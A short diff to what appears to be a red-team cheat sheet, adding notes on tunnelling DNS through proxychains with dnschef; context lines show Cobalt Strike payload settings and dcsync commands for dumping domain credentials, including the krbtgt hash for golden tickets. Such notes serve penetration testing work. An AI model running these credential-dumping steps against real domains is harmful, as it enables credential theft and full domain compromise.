@@ -217,6 +217,12 @@ Cobalt
     set prependmigrate true
     set disablepayloadhandler true
 
+Proxy DNS
+    Install dnschef
+    sudo proxychains ./dnschef.py --nameservers 10.9.15.11 --tcp
+    vim /etc/resolv.conf (set nameserver 127.0.0.1)
+    DNS works through tcp not udp
+
 Overpass the Hash
   dcsync fqdn domain\user (User must have DCSync rights in that domain)
   dcsync fqdn domain\krbtgt (golden ticket)
